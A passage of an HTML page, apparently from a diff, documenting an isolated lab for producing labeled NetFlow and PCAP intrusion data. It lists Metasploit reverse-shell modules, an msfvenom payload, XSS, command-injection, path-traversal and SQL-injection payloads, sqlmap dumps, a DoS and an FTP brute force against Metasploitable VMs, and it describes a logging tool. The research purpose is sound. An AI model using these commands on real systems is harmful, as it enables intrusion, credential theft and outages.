Z/UuuNVHNbbq5ujWUugX69Otp7O18+x+qrA+Emm32zibX9XD/mLp1EHMP+KTTfy4l/8uH/ADE/xSab+XEv/lw/5i6eRBzD/ik038uJf/Lh/wAxbvFPDdNjtU6WlzeSWJ4/fIH0Gmu+R319j9V0Gi06jT29Tbm1djNM9YbtPqLmnuRdtTiqO6kzw3eaynqaapvNJRNewsZNEwyuBPv0np9vqvvjjw5Ybi1fFcrlNPf62F3VH9oYGQtPsfLG9n7yfuV0ouTh3CtNw6iaLEYz17uriPFNTxGuKr85x0B2GgiIpFHiIiAiIgIiICIiAiIgIiICIiAiIgIiICIuQ/ETbobv42OPLZUTVUMNRQxMkfS1D4JQ3zJ99L2EObv02CD9UHXir7BOXMbzHkbI8EtlFdobljxcKuWoijbC/pf0HoLXlx7n3aOy57xew0XHHjlhw3FH1VHj94tznVdC6qkla/qp3uOy9xc49TOoEkkbPdR3gjiXj7I/EjyLi16sH2q0WV8ht9P9snZ5PTOGj4mvDndu3xEoO50XG9Jb4uZvF9k+H8gS1lTjmP08woLOKqSGL97dGxrtMcDs9ZeSDs9u+hpZHh7udyxjmnkzieguNXW4pb6OrlooZ5nSikLHABrSfQaeWke5aD6oOwEXAvhx4yxHNfDfm95yRlY+qtk1TJRSCuljipnspmvDxGHCMuJ0CXA9gAvKXJL7kPgKr23ypqKv8nZFDSUk8zi5xhHQ4N2e5DS4gfIaHsg7/RcH884VacU8PvG/JNiqbrTZQWULHV7rjPI8NdTF4DA55bGGlo0GAADspR4kLzes25Z4w40ul0qqLHb1R0VTcGwP8sVMkryHb+eg3QB7Au3pB2Qi4syzCMbwHxo8aWPFqOait3kRSiGSrlnDXF04PSZHOLQdb0Dre+3ddpoCIiAiIgIiICIiAiIgIiICIiAiIgIiICr3KeI8byLlmx8l1tbdo7vZY2x00MMsYp3hpeR1tLC4n4z6OHsrCRBXtdxHjdZzTR8sS1t2F7pKfyI4Gyx/ZS3y3M2W9HVvTz+l66WiyXw+4nduQqvOrbkOX4xea3/rb7FcxTNnPbfVtjnd+kbAIB1vW1b6IKt5B4Mw/L8qiy1lfkGN5ExgjfdLFX/ZaiVob0/GelwJ122ACR2J0AsnA+JMT42xq+R41TVtVcrlBIayvrZjPV1TulxHU7QHqT2aBsnZ2VZKIOLvDFwFV5PxfdrfnVTyDibX3NwfbYqiShhrIvLjIdJDKwtf32OoD21vsuh8k4Swe8cSwcYQxVtpsEMrJWiglaJi9ri7qL5Gv2SSSSRv7lZSIKzz7hXFs04xsnH10r7zDa7N5P2eWmmibO7yozG3rLoy09id6aO/yUG8UGH45U0eI0twwPOcgbQRuigu2KgPuFAIwzoBZ0lrg499nXSW9vVdCog434o43yXJvEXZM3Fgzq247YoR5ldmk73XGslDX9PwuOx3eOzR0gMJ9TpdkIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiIP/2Q==" alt="NetFlow Deployment Scheme" style="max-width:220px; border:1px solid #dee2e6; border-radius:6px; padding:8px; background:#fff;"></div>
+    </section>
+
+    <!-- ATTACKS -->
+    <section class="section" id="attacks">
+      <h2><span class="num">04</span> Attacks</h2>
+      <div class="section-divider"></div>
+
+      <p>Each attack entry includes: <code>attack_name</code>, <code>exploit_cve</code> (if applicable), <code>target_port</code>, <code>protocol</code>, step-by-step instructions, and <code>attacklog</code> commands.</p>
+
+      <h3>Attack Outcomes</h3>
+      <div class="status-row">
+        <div class="status-pill success"><strong>success</strong> - exploited successfully</div>
+        <div class="status-pill ran"><strong>ran</strong> - executed without error, no exploit (also: scanning)</div>
+        <div class="status-pill error"><strong>error</strong> - tool errored / attack failed</div>
+      </div>
+
+      <!-- MS2 -->
+      <div class="vm-header" id="ms2">
+        <h3>Metasploitable 2</h3>
+        <span class="badge badge-tcp">Linux</span>
+      </div>
+      <p class="vm-note">Note: More attacks will be added before the infrastructure is ready.</p>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#1</span>
+          <span class="attack-title">Unix R-Services Reverse Shell</span>
+          <span class="badge badge-name">ms2-rservices-revshell</span>
+          <span class="badge badge-port">513</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms2-rservices-revshell --dst-ip &lt;dst-ip&gt; --dst-port 513</pre></div>
+          <div class="step-label">Execute</div>
+          <div class="code-block"><pre>rlogin -l root &lt;dst-ip&gt;</pre></div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#2</span>
+          <span class="attack-title">UnrealIRCD Backdoor Reverse Shell</span>
+          <span class="badge badge-name">ms2-unrealircd-revshell</span>
+          <span class="badge badge-port">6667</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms2-unrealircd-revshell --dst-ip &lt;dst-ip&gt; --dst-port 6667</pre></div>
+          <div class="step-label">Execute</div>
+          <div class="code-block">
+            <div class="code-block-label">Metasploit</div>
+            <pre>use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOST &lt;dst-ip&gt;
+set RPORT 6667
+set LHOST &lt;your_ip&gt;
+set LPORT 4444
+set payload cmd/unix/reverse
+exploit</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#3</span>
+          <span class="attack-title">DVWA XSS Reflected</span>
+          <span class="badge badge-name">ms2-dvwa-xss-reflected</span>
+          <span class="badge badge-port">80</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms2-dvwa-xss-reflected --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
+          <div class="step-label">Execute - Navigate to DVWA XSS (Reflected) page and inject</div>
+          <div class="code-block">
+            <div class="code-block-label">Low / Medium</div>
+            <pre>&lt;svg onload=alert('Example')&gt;</pre>
+          </div>
+          <p style="font-size:12px; color:#868e96; margin-top:6px;"><strong>High:</strong> same payload, same bypass.</p>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#4</span>
+          <span class="attack-title">DVWA XSS Stored</span>
+          <span class="badge badge-name">ms2-dvwa-xss-stored</span>
+          <span class="badge badge-port">80</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms2-dvwa-xss-stored --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
+          <div class="step-label">Execute - Navigate to DVWA XSS (Stored) page</div>
+          <div class="code-block">
+            <div class="code-block-label">Low - inject into message field</div>
+            <pre>&lt;script&gt;alert('example')&lt;/script&gt;</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-label">Medium - expand Name field maxlength in DevTools, inject into name</div>
+            <pre>&lt;img src=x onerror=alert('example')&gt;</pre>
+          </div>
+          <p style="font-size:12px; color:#868e96; margin-top:6px;"><strong>High:</strong> not bypassable.</p>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#5</span>
+          <span class="attack-title">DVWA Command Injection</span>
+          <span class="badge badge-name">ms2-dvwa-cmdinject</span>
+          <span class="badge badge-port">80</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms2-dvwa-cmdinject --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
+          <div class="step-label">Execute - Navigate to DVWA Command Execution page</div>
+          <div class="code-block">
+            <div class="code-block-label">Low</div>
+            <pre>127.0.0.1 &amp;&amp; whoami</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-label">Medium</div>
+            <pre>127.0.0.1 | whoami</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#6</span>
+          <span class="attack-title">DVWA File Inclusion (LFI)</span>
+          <span class="badge badge-name">ms2-dvwa-lfi</span>
+          <span class="badge badge-port">80</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms2-dvwa-lfi --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
+          <div class="step-label">Execute</div>
+          <div class="code-block">
+            <div class="code-block-label">Low</div>
+            <pre>http://&lt;dst-ip&gt;/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#7</span>
+          <span class="attack-title">DVWA SQL Injection (Manual)</span>
+          <span class="badge badge-name">ms2-dvwa-sqli-manual</span>
+          <span class="badge badge-port">80</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms2-dvwa-sqli-manual --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
+          <div class="step-label">Execute - Navigate to DVWA SQL Injection page</div>
+          <div class="code-block">
+            <div class="code-block-label">Low - basic bypass</div>
+            <pre>1' or 1 = '1</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-label">Low - dump column names</div>
+            <pre>'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-label">Low - dump credentials</div>
+            <pre>' UNION SELECT user, password FROM users#</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-label">Medium</div>
+            <pre>1 UNION SELECT user, password FROM users#</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#8</span>
+          <span class="attack-title">Mutillidae SQLMap</span>
+          <span class="badge badge-name">ms2-mutillidae-sqlmap</span>
+          <span class="badge badge-port">80</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms2-mutillidae-sqlmap --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
+          <div class="step-label">Execute - pick based on traffic pattern needed</div>
+          <div class="code-block">
+            <div class="code-block-label">Basic scan</div>
+            <pre>sqlmap -u "http://&lt;dst-ip&gt;/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username,password --batch</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-label">Boolean-based blind</div>
+            <pre>sqlmap -u "http://&lt;dst-ip&gt;/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=B --batch --level=3</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-label">Time-based blind</div>
+            <pre>sqlmap -u "http://&lt;dst-ip&gt;/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=T --batch --level=3</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-label">Error-based</div>
+            <pre>sqlmap -u "http://&lt;dst-ip&gt;/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=E --batch --level=3</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-label">UNION-based</div>
+            <pre>sqlmap -u "http://&lt;dst-ip&gt;/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=U --batch --level=3 --union-cols=3-6</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-label">Full dump - aggressive</div>
+            <pre>sqlmap -u "http://&lt;dst-ip&gt;/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --batch --dbs --tables --dump --level=5 --risk=3</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <!-- MS3 -->
+      <div class="vm-header" id="ms3">
+        <h3>Metasploitable 3</h3>
+        <span class="badge badge-win">Windows</span>
+      </div>
+      <p class="vm-note">Note: More attacks will be added before the infrastructure is ready.</p>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#9</span>
+          <span class="attack-title">GlassFish Reverse Shell</span>
+          <span class="badge badge-name">ms3-glassfish-revshell</span>
+          <span class="badge badge-port">4848</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms3-glassfish-revshell --dst-ip &lt;dst-ip&gt; --dst-port 4848</pre></div>
+          <div class="step-label">Generate payload</div>
+          <div class="code-block"><pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;your_ip&gt; LPORT=4444 -f war -o shell.war</pre></div>
+          <div class="step-label">Start listener</div>
+          <div class="code-block">
+            <div class="code-block-label">Metasploit</div>
+            <pre>use exploit/multi/handler
+set PAYLOAD java/jsp_shell_reverse_tcp
+set LHOST &lt;your_ip&gt;
+set LPORT 4444
+run</pre>
+          </div>
+          <div class="step-label">Upload via GlassFish admin panel at http://&lt;dst-ip&gt;:4848 - credentials: admin / sploit</div>
+          <ol style="margin: 8px 0; font-size:13px;">
+            <li>Left panel → <strong>Applications</strong> → <strong>Deploy</strong></li>
+            <li>Select <code>shell.war</code> → <strong>OK</strong></li>
+          </ol>
+          <div class="step-label">Trigger</div>
+          <div class="code-block"><pre>curl http://&lt;dst-ip&gt;:8080/shell/</pre></div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#10</span>
+          <span class="attack-title">Jenkins Reverse Shell</span>
+          <span class="badge badge-name">ms3-jenkins-revshell</span>
+          <span class="badge badge-port">8484</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms3-jenkins-revshell --dst-ip &lt;dst-ip&gt; --dst-port 8484</pre></div>
+          <div class="step-label">Execute</div>
+          <div class="code-block">
+            <div class="code-block-label">Metasploit</div>
+            <pre>use exploit/multi/http/jenkins_script_console
+set RHOSTS &lt;dst-ip&gt;
+set RPORT 8484
+set LHOST &lt;your_ip&gt;
+set LPORT 4447
+set PAYLOAD windows/meterpreter/reverse_tcp
+set TARGETURI /script
+exploit</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#11</span>
+          <span class="attack-title">IIS HTTP Denial of Service</span>
+          <span class="badge badge-name">ms3-iis-http-dos</span>
+          <span class="badge badge-port">80</span>
+          <span class="badge badge-tcp">TCP</span>
+          <span class="badge badge-cve">CVE-2015-1635</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms3-iis-http-dos --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
+          <div class="step-label">Execute</div>
+          <div class="code-block">
+            <div class="code-block-label">Metasploit</div>
+            <pre>use auxiliary/dos/http/ms15_034_ulonglongadd
+set RHOSTS &lt;dst-ip&gt;
+set RPORT 80
+run</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#12</span>
+          <span class="attack-title">IIS FTP Wordlist Login Attack</span>
+          <span class="badge badge-name">ms3-iis-ftp-wordlist</span>
+          <span class="badge badge-port">21</span>
+          <span class="badge badge-tcp">TCP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms3-iis-ftp-wordlist --dst-ip &lt;dst-ip&gt; --dst-port 21</pre></div>
+          <div class="step-label">Execute</div>
+          <div class="code-block">
+            <div class="code-block-label">Metasploit</div>
+            <pre>use auxiliary/scanner/ftp/ftp_login
+set RHOSTS &lt;dst-ip&gt;
+set RPORT 21
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#13</span>
+          <span class="attack-title">ElasticSearch Reverse Shell</span>
+          <span class="badge badge-name">ms3-elasticsearch-revshell</span>
+          <span class="badge badge-port">9200</span>
+          <span class="badge badge-tcp">TCP</span>
+          <span class="badge badge-cve">CVE-2014-3120</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms3-elasticsearch-revshell --dst-ip &lt;dst-ip&gt; --dst-port 9200</pre></div>
+          <div class="step-label">Execute</div>
+          <div class="code-block">
+            <div class="code-block-label">Metasploit</div>
+            <pre>use exploit/multi/elasticsearch/script_mvel_rce
+set RHOSTS &lt;dst-ip&gt;
+set RPORT 9200
+set LHOST &lt;your_ip&gt;
+set LPORT 4444
+set PAYLOAD java/meterpreter/reverse_tcp
+run</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#14</span>
+          <span class="attack-title">SNMP Enumeration</span>
+          <span class="badge badge-name">ms3-snmp-enum</span>
+          <span class="badge badge-port">161</span>
+          <span class="badge badge-udp">UDP</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms3-snmp-enum --dst-ip &lt;dst-ip&gt; --dst-port 161 --protocol udp</pre></div>
+          <div class="step-label">Execute</div>
+          <div class="code-block">
+            <div class="code-block-label">Metasploit</div>
+            <pre>use auxiliary/scanner/snmp/snmp_enum
+set RHOSTS &lt;dst-ip&gt;
+set RPORT 161
+set COMMUNITY public
+set VERSION 1
+run</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <div class="attack">
+        <div class="attack-header">
+          <span class="attack-num">#15</span>
+          <span class="attack-title">JMX Reverse Shell</span>
+          <span class="badge badge-name">ms3-jmx-revshell</span>
+          <span class="badge badge-port">1617</span>
+          <span class="badge badge-tcp">TCP</span>
+          <span class="badge badge-cve">CVE-2015-2342</span>
+        </div>
+        <div class="attack-body">
+          <div class="step-label">Start</div>
+          <div class="code-block"><pre>attacklog start --name ms3-jmx-revshell --dst-ip &lt;dst-ip&gt; --dst-port 1617</pre></div>
+          <div class="step-label">Execute</div>
+          <div class="code-block">
+            <div class="code-block-label">Metasploit</div>
+            <pre>use exploit/multi/misc/java_jmx_server
+set RHOSTS &lt;dst-ip&gt;
+set RPORT 1617
+set LHOST &lt;your_ip&gt;
+set LPORT 4444
+set payload java/meterpreter/reverse_tcp
+run</pre>
+          </div>
+          <div class="step-label">End</div>
+          <div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
+        </div>
+      </div>
+
+      <!-- SecGen -->
+      <div class="vm-header" id="secgen">
+        <h3>SecGen</h3>
+        <span class="badge badge-wip">Testing</span>
+      </div>
+      <p class="vm-note">Still under testing phase.</p>
+
+      <!-- VulnHub -->
+      <div class="vm-header" id="vulnhub">
+        <h3>VulnHub</h3>
+        <span class="badge badge-wip">Pending</span>
+      </div>
+      <p class="vm-note">More attacks will be added before the infrastructure is ready.</p>
+      <ul>
+        <li><a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank">Flask SSTI</a></li>
+        <li><a href="https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11978" target="_blank">Airflow CVE-2020-11978</a></li>
+      </ul>
+
+    </section>
+
+    <!-- AUTO LABELING -->
+    <section class="section" id="labeling">
+      <h2><span class="num">05</span> Automatic Labeling</h2>
+      <div class="section-divider"></div>
+
+      <p>Dedicated to automatic labeling of flows and raw packet captures after conducting attacks. A CLI tool called <code>attacklog</code> - written in pure Python - records attack start and end events into a local SQLite database.</p>
+
+      <h3>Process</h3>
+      <p>Each attacker runs <code>attacklog</code> (pre-installed on their Kali VM) to bracket every attack. This produces one structured record per attack, joined against captured flows and packets during post-processing.</p>
+
+      <h3>What Each Record Captures</h3>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Field</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td>attack_id</td><td>Unique UUID - auto-generated per attempt</td></tr>
+            <tr><td>attacker_id + src_ip</td><td>Set once at init. Format: <code>attacker_&lt;number&gt;</code></td></tr>
+            <tr><td>attack_name</td><td>Canonical name matching the Attacks section</td></tr>
+            <tr><td>dst_ip + dst_port + protocol</td><td>Entered at start</td></tr>
+            <tr><td>t_start / t_end</td><td>Millisecond-precision UTC timestamps from system clock</td></tr>
+            <tr><td>status</td><td><code>success</code>, <code>ran</code>, or <code>error</code></td></tr>
+            <tr><td>notes</td><td>Optional free-text field for anomalies</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Attacker Workflow (per attack)</h3>
+      <ol>
+        <li>Run <code>attacklog start</code> with attack name, destination IP, port, and protocol</li>
+        <li>Execute the attack following the step-by-step instructions</li>
+        <li>Run <code>attacklog end</code> with the outcome status</li>
+      </ol>
+
+      <h3>Setup</h3>
+      <ul>
+        <li>Each attacker receives a preconfigured Kali VM</li>
+        <li>NTP synced to <code>ntp.finki.ukim.mk</code> on all machines before any session - critical for timestamp joining</li>
+        <li><code>attacklog</code> is pre-installed and initialized with the attacker's <code>attacker_id</code> and static IP</li>
+        <li>Static IP per attacker makes <code>src_ip</code> a reliable identifier during flow/packet matching</li>
+      </ul>
+
+      <h3>Labeling Logic</h3>
+      <p>The labeling script joins the <code>attacklog</code> export against NetFlow and PCAP data using:</p>
+      <ul>
+        <li><code>src_ip</code> + <code>dst_ip</code> + <code>dst_port</code> + <code>protocol</code> as the join key (source port recovered from PCAP)</li>
+        <li><code>t_start</code> / <code>t_end</code> as the time window with ±1s jitter tolerance</li>
+      </ul>
+      <p>Any flow outside a matched window is labeled <strong>benign</strong>. Safe in this isolated environment - no legitimate traffic exists on target service ports.</p>
+
+      <h3>Open Attack Guard</h3>
+      <p><code>attacklog</code> refuses to start a new attack if a previous one has no <code>t_end</code>.</p>
+
+      <h3>Data Storage &amp; Export</h3>
+      <ul>
+        <li>Records stored at <code>~/.attacklog/attacks.db</code> (SQLite)</li>
+        <li>Exported via <code>attacklog export --format json</code> or <code>--format csv</code> at session end</li>
+        <li>Kafka integration deferred - to be discussed</li>
+      </ul>
+
+      <h3>Not Recorded (by design)</h3>
+      <ul>
+        <li><strong>Callback sessions</strong> (dst → src) - recoverable from PCAP if needed</li>
+        <li><strong>CVE, tool, payload</strong> - defined in attack files, joined by <code>attack_name</code> during post-processing</li>
+      </ul>
+
+      <h3>Tool Reference</h3>
+      <div class="code-block">
+        <div class="code-block-label">Initialization</div>
+        <pre>python attacklog.py init --attacker-id attacker_&lt;number&gt; --src-ip &lt;src_ip&gt;</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-label">Start attack</div>
+        <pre>python attacklog.py start --name &lt;attack_name&gt; --dst-ip &lt;dst-ip&gt; --dst-port &lt;port&gt;</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-label">End attack</div>
+        <pre>python attacklog.py end --status &lt;success|ran|error&gt; --notes &lt;optional&gt;</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-label">List attacks</div>
+        <pre>python attacklog.py list</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-label">Export</div>
+        <pre>python attacklog.py export --format &lt;json|csv&gt; --output &lt;file&gt;</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-label">Add to PATH</div>
+        <pre>chmod +x attacklog.py
+sudo mv attacklog.py /usr/local/bin/attacklog
+attacklog init --attacker-id attacker_&lt;number&gt; --src-ip &lt;src_ip&gt;</pre>
+      </div>
+
+    </section>
+
+  </main>
+</div>
+</body>
+</html>
